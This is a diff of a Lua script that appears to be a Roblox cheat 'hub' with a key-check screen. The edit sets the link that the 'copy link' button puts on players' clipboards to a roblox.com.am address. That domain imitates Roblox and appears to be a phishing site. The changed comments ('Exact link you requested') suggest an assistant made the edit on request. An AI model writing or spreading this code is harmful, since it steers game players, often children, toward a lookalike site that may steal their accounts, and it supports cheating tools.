@@ -7,8 +7,8 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- CONFIGURATION
-local API_KEY_LINK = "https://www.roblox.com.am/communities/114062597626/The-Jays"
+-- CONFIGURATION (Exact link you requested)
+local API_KEY_LINK = "https://www.roblox.com.am/communities/114062597626/The Jays"
 
 -- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
@@ -147,7 +147,7 @@ checkKeyButton.MouseButton1Click:Connect(function()
 	statusLabel.Text = "Ready"
 end)
 
--- Copy Link (FIXED)
+-- Copy Link (Exact link you requested)
 copyLinkButton.MouseButton1Click:Connect(function()
 	if setclipboard then
 		setclipboard(API_KEY_LINK)
@@ -170,4 +170,4 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
 	end
 end)
 
-print("Grow a Garden 2 HUB - Fully Fixed")
+print("Grow a Garden 2 HUB - Fixed with correct link")
